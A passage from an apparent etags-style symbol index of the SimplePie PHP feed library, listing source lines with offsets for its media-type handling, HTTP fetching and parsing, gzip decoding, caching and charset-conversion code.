							$width = $opt[1];width6982,203180
							$height = $opt[1];height6986,203241
							$bgcolor = $opt[1];bgcolor6990,203304
							$mediaplayer = $opt[1];mediaplayer6994,203372
							$widescreen = $opt[1];widescreen6998,203443
		$mime = explode('/', $type, 2);mime7005,203510
		$mime = $mime[0];mime7006,203544
					$width = 480;width7015,203690
					$width = round((intval($height)/9)*16);width7019,203746
					$width = round((intval($height)/3)*4);width7023,203812
				$width = '100%';width7028,203880
				$height = 0;height7036,203972
						$height = 270;height7044,204091
						$height = 360;height7048,204136
					$height = round((intval($width)/16)*9);height7053,204201
					$height = round((intval($width)/4)*3);height7057,204267
				$height = 376;height7062,204335
			$height = 0;height7067,204396
			$placeholder = $audio;placeholder7073,204480
			$placeholder = $video;placeholder7077,204543
		$embed = '';embed7080,204574
			static $javascript_outputted = null;javascript_outputted7085,204652
			static $javascript_outputted = null;javascript_outputted7085,204652
				$javascript_outputted = true;javascript_outputted7089,204858
		elseif ($handler === 'quicktime' || ($handler === 'mp3' && $mediaplayer === ''))mediaplayer7136,206856
	function get_real_type($find_handler = false)get_real_type7176,208516
		$types_flash = array('application/x-shockwave-flash', 'application/futuresplash'); // Flashtypes_flash7185,208743
		$types_fmedia = array('video/flv', 'video/x-flv','flv-application/octet-stream'); // Flash Media Playertypes_fmedia7186,208837
		$types_quicktime = array('audio/3gpp', 'audio/3gpp2', 'audio/aac', 'audio/x-aac', 'audio/aiff', 'audio/x-aiff', 'audio/mid', 'audio/midi', 'audio/x-midi', 'audio/mp4', 'audio/m4a', 'audio/x-m4a', 'audio/wav', 'audio/x-wav', 'video/3gpp', 'video/3gpp2', 'video/m4v', 'video/x-m4v', 'video/mp4', 'video/mpeg', 'video/x-mpeg', 'video/quicktime', 'video/sd-video'); // QuickTimetypes_quicktime7187,208943
		$types_wmedia = array('application/asx', 'application/x-mplayer2', 'audio/x-ms-wma', 'audio/x-ms-wax', 'video/x-ms-asf-plugin', 'video/x-ms-asf', 'video/x-ms-wm', 'video/x-ms-wmv', 'video/x-ms-wvx'); // Windows Mediatypes_wmedia7188,209320
		$types_mp3 = array('audio/mp3', 'audio/x-mp3', 'audio/mpeg', 'audio/x-mpeg'); // MP3types_mp37189,209539
			$type = strtolower($this->type);type7193,209665
			$type = null;type7197,209716
					$type = 'audio/acc';type7208,210059
					$type = 'audio/aiff';type7215,210165
					$type = 'audio/wav';type7219,210221
					$type = 'audio/midi';type7226,210325
					$type = 'audio/x-m4a';type7230,210381
					$type = 'audio/mp3';type7235,210454
					$type = 'audio/wav';type7239,210509
					$type = 'audio/x-ms-wax';type7243,210564
					$type = 'audio/x-ms-wma';type7247,210624
					$type = 'video/3gpp';type7253,210725
					$type = 'video/3gpp2';type7258,210798
					$type = 'video/x-ms-asf';type7262,210855
					$type = 'video/x-flv';type7266,210915
					$type = 'video/mpeg';type7280,211133
					$type = 'video/x-m4v';type7284,211189
					$type = 'video/quicktime';type7289,211261
					$type = 'video/mp4';type7294,211339
					$type = 'video/sd-video';type7298,211394
					$type = 'video/x-ms-wm';type7302,211453
					$type = 'video/x-ms-wmv';type7306,211512
					$type = 'video/x-ms-wvx';type7310,211572
					$type = 'application/futuresplash';type7315,211656
					$type = 'application/x-shockwave-flash';type7319,211726
class SimplePie_CaptionSimplePie_Caption7358,212260
	var $type;type7360,212286
	var $lang;lang7361,212298
	var $startTime;startTime7362,212310
	var $endTime;endTime7363,212327
	var $text;text7364,212342
	function SimplePie_Caption($type = null, $lang = null, $startTime = null, $endTime = null, $text = null)SimplePie_Caption7367,212395
	function SimplePie_Caption($type = null, $lang = null, $startTime = null, $endTime = null, $text = null)lang7367,212395
		$this->type = $type;type7369,212504
		$this->lang = $lang;lang7370,212527
		$this->startTime = $startTime;startTime7371,212550
		$this->endTime = $endTime;endTime7372,212583
		$this->text = $text;text7373,212612
	function __toString()__toString7376,212639
	function get_endtime()get_endtime7382,212735
	function get_language()get_language7394,212862
	function get_starttime()get_starttime7406,212984
	function get_text()get_text7418,213117
	function get_type()get_type7430,213235
class SimplePie_CreditSimplePie_Credit7443,213355
	var $role;role7445,213380
	var $scheme;scheme7446,213392
	var $name;name7447,213406
	function SimplePie_Credit($role = null, $scheme = null, $name = null)SimplePie_Credit7450,213459
	function SimplePie_Credit($role = null, $scheme = null, $name = null)scheme7450,213459
		$this->role = $role;role7452,213533
		$this->scheme = $scheme;scheme7453,213556
		$this->name = $name;name7454,213583
	function __toString()__toString7457,213610
	function get_role()get_role7463,213706
	function get_scheme()get_scheme7475,213824
	function get_name()get_name7487,213948
class SimplePie_CopyrightSimplePie_Copyright7500,214068
	var $url;url7502,214096
	var $label;label7503,214107
	function SimplePie_Copyright($url = null, $label = null)SimplePie_Copyright7506,214161
	function SimplePie_Copyright($url = null, $label = null)label7506,214161
		$this->url = $url;url7508,214222
		$this->label = $label;label7509,214243
	function __toString()__toString7512,214272
	function get_url()get_url7518,214368
	function get_attribution()get_attribution7530,214483
class SimplePie_RatingSimplePie_Rating7543,214612
	var $scheme;scheme7545,214637
	var $value;value7546,214651
	function SimplePie_Rating($scheme = null, $value = null)SimplePie_Rating7549,214705
	function SimplePie_Rating($scheme = null, $value = null)value7549,214705
		$this->scheme = $scheme;scheme7551,214766
		$this->value = $value;value7552,214793
	function __toString()__toString7555,214822
	function get_scheme()get_scheme7561,214918
	function get_value()get_value7573,215042
class SimplePie_RestrictionSimplePie_Restriction7586,215165
	var $relationship;relationship7588,215195
	var $type;type7589,215215
	var $value;value7590,215227
	function SimplePie_Restriction($relationship = null, $type = null, $value = null)SimplePie_Restriction7593,215281
	function SimplePie_Restriction($relationship = null, $type = null, $value = null)type7593,215281
		$this->relationship = $relationship;relationship7595,215367
		$this->type = $type;type7596,215406
		$this->value = $value;value7597,215429
	function __toString()__toString7600,215458
	function get_relationship()get_relationship7606,215554
	function get_type()get_type7618,215696
	function get_value()get_value7630,215814
class SimplePie_FileSimplePie_File7646,216001
	var $url;url7648,216024
	var $useragent;useragent7649,216035
	var $success = true;success7650,216052
	var $success = true;success7650,216052
	var $headers = array();headers7651,216074
	var $headers = array();headers7651,216074
	var $body;body7652,216099
	var $status_code;status_code7653,216111
	var $redirects = 0;redirects7654,216130
	var $redirects = 0;redirects7654,216130
	var $error;error7655,216151
	var $method = SIMPLEPIE_FILE_SOURCE_NONE;method7656,216164
	var $method = SIMPLEPIE_FILE_SOURCE_NONE;method7656,216164
	function SimplePie_File($url, $timeout = 10, $redirects = 5, $headers = null, $useragent = null, $force_fsockopen = false)SimplePie_File7658,216208
	function SimplePie_File($url, $timeout = 10, $redirects = 5, $headers = null, $useragent = null, $force_fsockopen = false)timeout7658,216208
			$idn =& new idna_convert;idn7662,216375
			$parsed = SimplePie_Misc::parse_url($url);parsed7663,216404
			$url = SimplePie_Misc::compress_parse_url($parsed['scheme'], $idn->encode($parsed['authority']), $parsed['path'], $parsed['query'], $parsed['fragment']);url7664,216450
		$this->url = $url;url7666,216611
		$this->useragent = $useragent;useragent7667,216632
				$useragent = ini_get('user_agent');useragent7672,216747
				$this->useragent = $useragent;useragent7673,216787
				$headers = array();headers7677,216860
				$this->method = SIMPLEPIE_FILE_SOURCE_REMOTE | SIMPLEPIE_FILE_SOURCE_CURL;method7681,216952
				$fp = curl_init();fp7682,217031
				$headers2 = array();headers27683,217054
				foreach ($headers as $key => $value)key7684,217079
				$this->headers = curl_exec($fp);headers7706,217935
					$this->headers = curl_exec($fp);headers7710,218085
					$this->error = 'cURL error ' . curl_errno($fp) . ': ' . curl_error($fp);error7714,218160
					$this->success = false;success7715,218238
					$info = curl_getinfo($fp);info7719,218288
					$this->headers = explode("\r\n\r\n", $this->headers, $info['redirect_count'] + 1);headers7721,218342
					$this->headers = array_pop($this->headers);headers7722,218430
					$parser =& new SimplePie_HTTP_Parser($this->headers);parser7723,218479
						$this->headers = $parser->headers;headers7726,218572
						$this->body = $parser->body;body7727,218613
						$this->status_code = $parser->status_code;status_code7728,218648
							$location = SimplePie_Misc::absolutize_url($this->headers['location'], $url);location7732,218932
				$this->method = SIMPLEPIE_FILE_SOURCE_REMOTE | SIMPLEPIE_FILE_SOURCE_FSOCKOPEN;method7740,219166
				$url_parts = parse_url($url);url_parts7741,219250
				$socket_host = $url_parts['host'];socket_host7742,219284
					$socket_host = "ssl://$url_parts[host]";socket_host7745,219414
				$fp = @fsockopen($socket_host, $url_parts['port'], $errno, $errstr, $timeout);fp7752,219575
					$this->error = 'fsockopen error: ' . $errstr;error7755,219678
					$this->success = false;success7756,219729
							$get = "$url_parts[path]?$url_parts[query]";get7765,219908
							$get = $url_parts['path'];get7769,219987
						$get = '/';get7774,220053
					$out = "GET $get HTTP/1.0\r\n";out7776,220078
					foreach ($headers as $key => $value)key7788,220489
					$info = stream_get_meta_data($fp);info7795,220646
					$this->headers = '';headers7797,220687
						$info = stream_get_meta_data($fp);info7801,220812
						$parser =& new SimplePie_HTTP_Parser($this->headers);parser7805,220897
							$this->headers = $parser->headers;headers7808,220993
							$this->body = $parser->body;body7809,221035
							$this->status_code = $parser->status_code;status_code7810,221071
								$location = SimplePie_Misc::absolutize_url($this->headers['location'], $url);location7814,221359
										$decoder =& new SimplePie_gzdecode($this->body);decoder7824,221839
											$this->error = 'Unable to decode HTTP "gzip" stream';error7827,221944
											$this->success = false;success7828,222009
											$this->body = $decoder->data;body7832,222083
												$this->error = 'Unable to decode HTTP "deflate" stream';error7841,222324
												$this->success = false;success7842,222393
										$this->body = $body;body7845,222454
										$this->error = 'Unknown content coding';error7849,222521
										$this->success = false;success7850,222572
						$this->error = 'fsocket timed out';error7857,222657
						$this->success = false;success7858,222699
			$this->method = SIMPLEPIE_FILE_SOURCE_LOCAL | SIMPLEPIE_FILE_SOURCE_FILE_GET_CONTENTS;method7866,222780
				$this->error = 'file_get_contents could not read the file';error7869,222922
				$this->success = false;success7870,222986
class SimplePie_HTTP_ParserSimplePie_HTTP_Parser7881,223086
	var $http_version = 0.0;http_version7889,223181
	var $http_version = 0.0;http_version7889,223181
	var $status_code = 0;status_code7897,223270
	var $status_code = 0;status_code7897,223270
	var $reason = '';reason7905,223361
	var $reason = '';reason7905,223361
	var $headers = array();headers7913,223464
	var $headers = array();headers7913,223464
	var $body = '';body7921,223564
	var $body = '';body7921,223564
	var $state = 'http_version';state7929,223671
	var $state = 'http_version';state7929,223671
	var $data = '';data7937,223767
	var $data = '';data7937,223767
	var $data_length = 0;data_length7945,223907
	var $data_length = 0;data_length7945,223907
	var $position = 0;position7953,224014
	var $position = 0;position7953,224014
	var $name = '';name7961,224131
	var $name = '';name7961,224131
	var $value = '';value7969,224246
	var $value = '';value7969,224246
	 * Create an instance of the class with the input datawith7972,224270
	function SimplePie_HTTP_Parser($data)SimplePie_HTTP_Parser7977,224389
		$this->data = $data;data7979,224431
		$this->data_length = strlen($this->data);data_length7980,224454
	function parse()parse7989,224611
			$state = $this->state;state7993,224707
		$this->data = '';data7996,224757
		if ($this->state === 'emit' || $this->state === 'body')state7997,224777
			$this->http_version = '';http_version8003,224870
			$this->status_code = '';status_code8004,224899
			$this->reason = '';reason8005,224927
			$this->headers = array();headers8006,224950
			$this->body = '';body8007,224979
	function has_data()has_data8018,225171
	function is_linear_whitespace()is_linear_whitespace8029,225391
	function http_version()http_version8043,225792
			$len = strspn($this->data, '0123456789.', 5);len8047,225922
			$this->http_version = substr($this->data, 5, $len);http_version8048,225971
				$this->http_version = (float) $this->http_version;http_version8052,226115
				$this->state = 'status';state8054,226243
				$this->state = false;state8058,226290
			$this->state = false;state8063,226336
	function status()status8072,226429
			$this->status_code = (int) substr($this->data, $this->position, $len);status_code8076,226520
			$this->state = 'reason';state8078,226622
			$this->state = false;state8082,226665
	function reason()reason8091,226760
		$len = strcspn($this->data, "\x0A", $this->position);len8093,226782
		$this->reason = trim(substr($this->data, $this->position, $len), "\x09\x0D\x20");reason8094,226838
		$this->state = 'new_line';state8096,226953
	function new_line()new_line8104,227077
		$this->value = trim($this->value, "\x0D\x20");value8106,227101
			$this->name = strtolower($this->name);name8109,227203
		$this->name = '';name8119,227424
		$this->value = '';value8120,227444
			$this->state = 'body';state8124,227559
			$this->state = 'body';state8129,227666
			$this->state = 'name';state8133,227707
	function name()name8142,227799
		$len = strcspn($this->data, "\x0A:", $this->position);len8144,227819
				$this->state = 'new_line';state8150,228019
				$this->name = substr($this->data, $this->position, $len);name8154,228068
				$this->state = 'value';state8156,228163
			$this->state = false;state8161,228211
	function linear_whitespace()linear_whitespace8170,228350
	function value()value8192,228844
					$this->state = 'quote';state8204,229036
					$this->state = 'new_line';state8209,229119
					$this->state = 'value_char';state8213,229177
	function value_char()value_char8224,229316
		$len = strcspn($this->data, "\x09\x20\x0A\"", $this->position);len8226,229342
		$this->state = 'value';state8229,229497
	function quote()quote8237,229625
					$this->state = 'value';state8249,229817
					$this->state = 'new_line';state8254,229900
					$this->state = 'quote_escaped';state8259,229984
					$this->state = 'quote_char';state8263,230047
	function quote_char()quote_char8274,230185
		$len = strcspn($this->data, "\x09\x20\x0A\"\\", $this->position);len8276,230211
		$this->state = 'value';state8279,230368
	function quote_escaped()quote_escaped8287,230477
		$this->state = 'quote';state8291,230575
	function body()body8299,230658
		$this->body = substr($this->data, $this->position);body8301,230678
		$this->state = 'emit';state8302,230732
class SimplePie_gzdecodeSimplePie_gzdecode8311,230808
	var $compressed_data;compressed_data8319,230914
	var $compressed_size;compressed_size8326,231000
	var $min_compressed_size = 18;min_compressed_size8333,231098
	var $min_compressed_size = 18;min_compressed_size8333,231098
	var $position = 0;position8340,231197
	var $position = 0;position8340,231197
	var $flags;flags8347,231268
	var $data;data8355,231373
	var $MTIME;MTIME8362,231437
	var $XFL;XFL8369,231500
	var $OS;OS8376,231566
	var $SI1;SI18385,231684
	var $SI2;SI28394,231803
	var $extra_field;extra_field8403,231920
	var $filename;filename8410,231995
	var $comment;comment8417,232072
	function __set($name, $value)__set8424,232156
	function SimplePie_gzdecode($data)SimplePie_gzdecode8434,232342
		$this->compressed_data = $data;compressed_data8436,232381
		$this->compressed_size = strlen($data);compressed_size8437,232415
	function parse()parse8445,232521
			$this->flags = ord($this->compressed_data[3]);flags8456,232754
			$mtime = substr($this->compressed_data, $this->position, 4);mtime8468,232985
				$mtime = strrev($mtime);mtime8472,233216
			$this->MTIME = current(unpack('l', $mtime));MTIME8474,233250
			$this->XFL = ord($this->compressed_data[$this->position++]);XFL8478,233356
			$this->OS = ord($this->compressed_data[$this->position++]);OS8481,233457
				$this->SI1 = $this->compressed_data[$this->position++];SI18487,233599
				$this->SI2 = $this->compressed_data[$this->position++];SI28488,233659
				$len = current(unpack('v', substr($this->compressed_data, $this->position, 2)));len8497,233874
					$this->extra_field = substr($this->compressed_data, $this->position, $len);extra_field8505,234197
				$len = strcspn($this->compressed_data, "\x00", $this->position);len8518,234450
					$this->filename = substr($this->compressed_data, $this->position, $len);filename8525,234739
				$len = strcspn($this->compressed_data, "\x00", $this->position);len8538,234996
					$this->comment = substr($this->compressed_data, $this->position, $len);comment8545,235284
					$crc = current(unpack('v', substr($this->compressed_data, $this->position, 2)));crc8562,235685
				$this->position = $this->compressed_size - 8;position8587,236199
			$crc = current(unpack('V', substr($this->compressed_data, $this->position, 4)));crc8591,236279
			$isize = current(unpack('V', substr($this->compressed_data, $this->position, 4)));isize8599,236572
class SimplePie_CacheSimplePie_Cache8616,236920
	function SimplePie_Cache()SimplePie_Cache8623,237018
	function create($location, $filename, $extension)create8634,237237
		$location_iri =& new SimplePie_IRI($location);location_iri8636,237291
class SimplePie_Cache_FileSimplePie_Cache_File8652,237629
	var $location;location8654,237658
	var $filename;filename8655,237674
	var $extension;extension8656,237690
	var $name;name8657,237707
	function SimplePie_Cache_File($location, $filename, $extension)SimplePie_Cache_File8659,237720
		$this->location = $location;location8661,237788
		$this->filename = $filename;filename8662,237819
		$this->extension = $extension;extension8663,237850
		$this->name = "$this->location/$this->filename.$this->extension";name8664,237883
	function save($data)save8667,237955
				$data = $data->data;data8673,238148
			$data = serialize($data);data8676,238179
				$fp = fopen($this->name, 'wb');fp8684,238334
	function load()load8696,238485
	function mtime()mtime8705,238648
	function touch()touch8714,238763
	function unlink()unlink8723,238874
class SimplePie_Cache_DBSimplePie_Cache_DB8733,238989
	function prepare_simplepie_object_for_cache($data)prepare_simplepie_object_for_cache8735,239016
		$items = $data->get_items();items8737,239071
		$items_by_id = array();items_by_id8738,239102
				$items_by_id = array();items_by_id8749,239289
				$channel =& $data->data['child'][SIMPLEPIE_NAMESPACE_ATOM_10]['feed'][0];channel8758,239494
				$channel =& $data->data['child'][SIMPLEPIE_NAMESPACE_ATOM_03]['feed'][0];channel8762,239662
				$channel =& $data->data['child'][SIMPLEPIE_NAMESPACE_RDF]['RDF'][0];channel8766,239825
				$channel =& $data->data['child'][SIMPLEPIE_NAMESPACE_RSS_20]['rss'][0]['child'][SIMPLEPIE_NAMESPACE_RSS_20]['channel'][0];channel8770,240037
				$channel = null;channel8774,240182
class SimplePie_Cache_MySQL extends SimplePie_Cache_DBSimplePie_Cache_MySQL8813,241238
	var $mysql;mysql8815,241295
	var $options;options8816,241308
	var $id;id8817,241323
	function SimplePie_Cache_MySQL($mysql_location, $name, $extension)SimplePie_Cache_MySQL8819,241334
		$host = $mysql_location->get_host();host8821,241405
			$server = ':' . substr($host, 5, -1);server8824,241530
			$server = $host;server8828,241586
			$username = $mysql_location->get_userinfo();username8841,241879
			$password = null;password8842,241927
			$this->id = $name . $extension;id8847,242024
			$this->options = SimplePie_Misc::parse_str($mysql_location->get_query());options8848,242059
				$db = array();db8858,242392
						$this->mysql = null;mysql8868,242807
						$this->mysql = null;mysql8876,243197
				$this->mysql = null;mysql8882,243255
	function save($data)save8887,243293
			$feed_id = "'" . mysql_real_escape_string($this->id) . "'";feed_id8891,243342
					$data = clone($data);data8898,243549
				$prepared = $this->prepare_simplepie_object_for_cache($data);prepared8901,243583
						$items = count($prepared[1]);items8907,243833
							$sql = 'UPDATE `' . $this->options['prefix'][0] . 'cache_data` SET `items` = ' . $items . ', `data` = \'' . mysql_real_escape_string($prepared[0]) . '\', `mtime` = ' . time() . ' WHERE `id` = ' . $feed_id;sql8910,243895
							$sql = 'UPDATE `' . $this->options['prefix'][0] . 'cache_data` SET `data` = \'' . mysql_real_escape_string($prepared[0]) . '\', `mtime` = ' . time() . ' WHERE `id` = ' . $feed_id;sql8914,244135
					$ids = array_keys($prepared[1]);ids8927,244713
							$existing_ids = array();existing_ids8937,245105
							$new_ids = array_diff($ids, $existing_ids);new_ids8943,245237
									$date = time();date8949,245406
	function load()load8984,246655
			$data = unserialize($row[1]);data8988,246914
				$items = (int) $this->options['items'][0];items8992,246995
				$items = (int) $row[0];items8996,247060
					$feed =& $data['child'][SIMPLEPIE_NAMESPACE_ATOM_10]['feed'][0];feed9003,247197
					$feed =& $data['child'][SIMPLEPIE_NAMESPACE_ATOM_03]['feed'][0];feed9007,247354
					$feed =& $data['child'][SIMPLEPIE_NAMESPACE_RDF]['RDF'][0];feed9011,247506
					$feed =& $data['child'][SIMPLEPIE_NAMESPACE_RSS_20]['rss'][0];feed9015,247656
					$feed = null;feed9019,247745
					$sql = 'SELECT `data` FROM `' . $this->options['prefix'][0] . 'items` WHERE `feed_id` = \'' . mysql_real_escape_string($this->id) . '\' ORDER BY `posted` DESC';sql9024,247801
	function mtime()mtime9048,248356
	function touch()touch9060,248667
	function unlink()unlink9072,248992
class SimplePie_MiscSimplePie_Misc9085,249423
	function time_hms($seconds)time_hms9087,249446
		$time = '';time9089,249478
		$hours = floor($seconds / 3600);hours9091,249493
		$remainder = $seconds % 3600;remainder9092,249528
		$minutes = floor($remainder / 60);minutes9098,249611
		$seconds = $remainder % 60;seconds9099,249648
			$minutes = '0' . $minutes;minutes9102,249717
			$seconds = '0' . $seconds;seconds9106,249776
	function absolutize_url($relative, $base)absolutize_url9115,249878
		$iri = SimplePie_IRI::absolutize(new SimplePie_IRI($base), $relative);iri9117,249924
	function remove_dot_segments($input)remove_dot_segments9121,250027
		$output = '';output9123,250068
		while (strpos($input, './') !== false || strpos($input, '/.') !== false || $input === '.' || $input === '..')input9124,250084
				$input = substr($input, 3);input9129,250367
				$input = substr($input, 2);input9133,250448
				$input = substr_replace($input, '/', 0, 3);input9138,250702
				$input = '/';input9142,250788
				$input = substr_replace($input, '/', 0, 4);input9147,251114
				$output = substr_replace($output, '', strrpos($output, '/'));output9148,251162
				$input = '/';input9152,251267
				$output = substr_replace($output, '', strrpos($output, '/'));output9153,251285
			elseif ($input === '.' || $input === '..')input9156,251466
				$input = '';input9158,251517
				$input = substr_replace($input, '', 0, $pos);input9164,251883
				$input = '';input9169,251974
	function get_element($realname, $string)get_element9175,252031
		$return = array();return9177,252076
		$name = preg_quote($realname, '/');name9178,252097
			for ($i = 0, $total_matches = count($matches); $i < $total_matches; $i++)total_matches9181,252295
					for ($j = 0, $total_attribs = count($attribs); $j < $total_attribs; $j++)total_attribs9198,253140
	function element_implode($element)element_implode9212,253494
		$full = "<$element[tag]";full9214,253533
		foreach ($element['attribs'] as $key => $value)key9215,253561
			$key = strtolower($key);key9217,253615
			$full .= " $key=\"" . htmlspecialchars($value['data']) . '"';key9218,253643
	function error($message, $level, $file, $line)error9231,253856
					$note = 'PHP Error';note9238,254007
					$note = 'PHP Warning';note9241,254070
					$note = 'PHP Notice';note9244,254134
					$note = 'Unknown Error';note9247,254186
			$log_error = true;log_error9251,254234
				$log_error = false;log_error9254,254299
			$log_file = @ini_get('error_log');log_file9257,254329
				$log_error = false;log_error9260,254453
	 * @param str $cache_class Name of the cache-handling class being usedbeing9288,255292
	function display_cached_file($identifier_url, $cache_location = './cache', $cache_extension = 'spc', $cache_class = 'SimplePie_Cache', $cache_name_function = 'md5')display_cached_file9294,255583
	function display_cached_file($identifier_url, $cache_location = './cache', $cache_extension = 'spc', $cache_class = 'SimplePie_Cache', $cache_name_function = 'md5')cache_location9294,255583
		$cache = call_user_func(array($cache_class, 'create'), $cache_location, $identifier_url, $cache_extension);cache9296,255752
	function fix_protocol($url, $http = 1)fix_protocol9316,256286
	function fix_protocol($url, $http = 1)http9316,256286
		$url = SimplePie_Misc::normalize_url($url);url9318,256329
		$parsed = SimplePie_Misc::parse_url($url);parsed9319,256375
	function parse_url($url)parse_url9348,257298
		$iri =& new SimplePie_IRI($url);iri9350,257327
	function compress_parse_url($scheme = '', $authority = '', $path = '', $query = '', $fragment = '')compress_parse_url9360,257610
	function compress_parse_url($scheme = '', $authority = '', $path = '', $query = '', $fragment = '')authority9360,257610
		$iri =& new SimplePie_IRI('');iri9362,257714
	function normalize_url($url)normalize_url9371,257926
		$iri =& new SimplePie_IRI($url);iri9373,257959
	function percent_encoding_normalization($match)percent_encoding_normalization9377,258024
		$integer = hexdec($match[1]);integer9379,258076
		if ($integer >= 0x41 && $integer <= 0x5A || $integer >= 0x61 && $integer <= 0x7A || $integer >= 0x30 && $integer <= 0x39 || $integer === 0x2D || $integer === 0x2E || $integer === 0x5F || $integer === 0x7E)integer9380,258108
	function utf8_bad_replace($str)utf8_bad_replace9401,258771
	function windows_1252_to_utf8($string)windows_1252_to_utf89433,259672
		static $convert_table = array("\x80" => "\xE2\x82\xAC", "\x81" => "\xEF\xBF\xBD", "\x82" => "\xE2\x80\x9A", "\x83" => "\xC6\x92", "\x84" => "\xE2\x80\x9E", "\x85" => "\xE2\x80\xA6", "\x86" => "\xE2\x80\xA0", "\x87" => "\xE2\x80\xA1", "\x88" => "\xCB\x86", "\x89" => "\xE2\x80\xB0", "\x8A" => "\xC5\xA0", "\x8B" => "\xE2\x80\xB9", "\x8C" => "\xC5\x92", "\x8D" => "\xEF\xBF\xBD", "\x8E" => "\xC5\xBD", "\x8F" => "\xEF\xBF\xBD", "\x90" => "\xEF\xBF\xBD", "\x91" => "\xE2\x80\x98", "\x92" => "\xE2\x80\x99", "\x93" => "\xE2\x80\x9C", "\x94" => "\xE2\x80\x9D", "\x95" => "\xE2\x80\xA2", "\x96" => "\xE2\x80\x93", "\x97" => "\xE2\x80\x94", "\x98" => "\xCB\x9C", "\x99" => "\xE2\x84\xA2", "\x9A" => "\xC5\xA1", "\x9B" => "\xE2\x80\xBA", "\x9C" => "\xC5\x93", "\x9D" => "\xEF\xBF\xBD", "\x9E" => "\xC5\xBE", "\x9F" => "\xC5\xB8", "\xA0" => "\xC2\xA0", "\xA1" => "\xC2\xA1", "\xA2" => "\xC2\xA2", "\xA3" => "\xC2\xA3", "\xA4" => "\xC2\xA4", "\xA5" => "\xC2\xA5", "\xA6" => "\xC2\xA6", "\xA7" => "\xC2\xA7", "\xA8" => "\xC2\xA8", "\xA9" => "\xC2\xA9", "\xAA" => "\xC2\xAA", "\xAB" => "\xC2\xAB", "\xAC" => "\xC2\xAC", "\xAD" => "\xC2\xAD", "\xAE" => "\xC2\xAE", "\xAF" => "\xC2\xAF", "\xB0" => "\xC2\xB0", "\xB1" => "\xC2\xB1", "\xB2" => "\xC2\xB2", "\xB3" => "\xC2\xB3", "\xB4" => "\xC2\xB4", "\xB5" => "\xC2\xB5", "\xB6" => "\xC2\xB6", "\xB7" => "\xC2\xB7", "\xB8" => "\xC2\xB8", "\xB9" => "\xC2\xB9", "\xBA" => "\xC2\xBA", "\xBB" => "\xC2\xBB", "\xBC" => "\xC2\xBC", "\xBD" => "\xC2\xBD", "\xBE" => "\xC2\xBE", "\xBF" => "\xC2\xBF", "\xC0" => "\xC3\x80", "\xC1" => "\xC3\x81", "\xC2" => "\xC3\x82", "\xC3" => "\xC3\x83", "\xC4" => "\xC3\x84", "\xC5" => "\xC3\x85", "\xC6" => "\xC3\x86", "\xC7" => "\xC3\x87", "\xC8" => "\xC3\x88", "\xC9" => "\xC3\x89", "\xCA" => "\xC3\x8A", "\xCB" => "\xC3\x8B", "\xCC" => "\xC3\x8C", "\xCD" => "\xC3\x8D", "\xCE" => "\xC3\x8E", "\xCF" => "\xC3\x8F", "\xD0" => "\xC3\x90", "\xD1" => "\xC3\x91", "\xD2" => "\xC3\x92", "\xD3" => "\xC3\x93", "\xD4" => "\xC3\x94", "\xD5" => "\xC3\x95", "\xD6" => "\xC3\x96", "\xD7" => "\xC3\x97", "\xD8" => "\xC3\x98", "\xD9" => "\xC3\x99", "\xDA" => "\xC3\x9A", "\xDB" => "\xC3\x9B", "\xDC" => "\xC3\x9C", "\xDD" => "\xC3\x9D", "\xDE" => "\xC3\x9E", "\xDF" => "\xC3\x9F", "\xE0" => "\xC3\xA0", "\xE1" => "\xC3\xA1", "\xE2" => "\xC3\xA2", "\xE3" => "\xC3\xA3", "\xE4" => "\xC3\xA4", "\xE5" => "\xC3\xA5", "\xE6" => "\xC3\xA6", "\xE7" => "\xC3\xA7", "\xE8" => "\xC3\xA8", "\xE9" => "\xC3\xA9", "\xEA" => "\xC3\xAA", "\xEB" => "\xC3\xAB", "\xEC" => "\xC3\xAC", "\xED" => "\xC3\xAD", "\xEE" => "\xC3\xAE", "\xEF" => "\xC3\xAF", "\xF0" => "\xC3\xB0", "\xF1" => "\xC3\xB1", "\xF2" => "\xC3\xB2", "\xF3" => "\xC3\xB3", "\xF4" => "\xC3\xB4", "\xF5" => "\xC3\xB5", "\xF6" => "\xC3\xB6", "\xF7" => "\xC3\xB7", "\xF8" => "\xC3\xB8", "\xF9" => "\xC3\xB9", "\xFA" => "\xC3\xBA", "\xFB" => "\xC3\xBB", "\xFC" => "\xC3\xBC", "\xFD" => "\xC3\xBD", "\xFE" => "\xC3\xBE", "\xFF" => "\xC3\xBF");convert_table9435,259715
		static $convert_table = array("\x80" => "\xE2\x82\xAC", "\x81" => "\xEF\xBF\xBD", "\x82" => "\xE2\x80\x9A", "\x83" => "\xC6\x92", "\x84" => "\xE2\x80\x9E", "\x85" => "\xE2\x80\xA6", "\x86" => "\xE2\x80\xA0", "\x87" => "\xE2\x80\xA1", "\x88" => "\xCB\x86", "\x89" => "\xE2\x80\xB0", "\x8A" => "\xC5\xA0", "\x8B" => "\xE2\x80\xB9", "\x8C" => "\xC5\x92", "\x8D" => "\xEF\xBF\xBD", "\x8E" => "\xC5\xBD", "\x8F" => "\xEF\xBF\xBD", "\x90" => "\xEF\xBF\xBD", "\x91" => "\xE2\x80\x98", "\x92" => "\xE2\x80\x99", "\x93" => "\xE2\x80\x9C", "\x94" => "\xE2\x80\x9D", "\x95" => "\xE2\x80\xA2", "\x96" => "\xE2\x80\x93", "\x97" => "\xE2\x80\x94", "\x98" => "\xCB\x9C", "\x99" => "\xE2\x84\xA2", "\x9A" => "\xC5\xA1", "\x9B" => "\xE2\x80\xBA", "\x9C" => "\xC5\x93", "\x9D" => "\xEF\xBF\xBD", "\x9E" => "\xC5\xBE", "\x9F" => "\xC5\xB8", "\xA0" => "\xC2\xA0", "\xA1" => "\xC2\xA1", "\xA2" => "\xC2\xA2", "\xA3" => "\xC2\xA3", "\xA4" => "\xC2\xA4", "\xA5" => "\xC2\xA5", "\xA6" => "\xC2\xA6", "\xA7" => "\xC2\xA7", "\xA8" => "\xC2\xA8", "\xA9" => "\xC2\xA9", "\xAA" => "\xC2\xAA", "\xAB" => "\xC2\xAB", "\xAC" => "\xC2\xAC", "\xAD" => "\xC2\xAD", "\xAE" => "\xC2\xAE", "\xAF" => "\xC2\xAF", "\xB0" => "\xC2\xB0", "\xB1" => "\xC2\xB1", "\xB2" => "\xC2\xB2", "\xB3" => "\xC2\xB3", "\xB4" => "\xC2\xB4", "\xB5" => "\xC2\xB5", "\xB6" => "\xC2\xB6", "\xB7" => "\xC2\xB7", "\xB8" => "\xC2\xB8", "\xB9" => "\xC2\xB9", "\xBA" => "\xC2\xBA", "\xBB" => "\xC2\xBB", "\xBC" => "\xC2\xBC", "\xBD" => 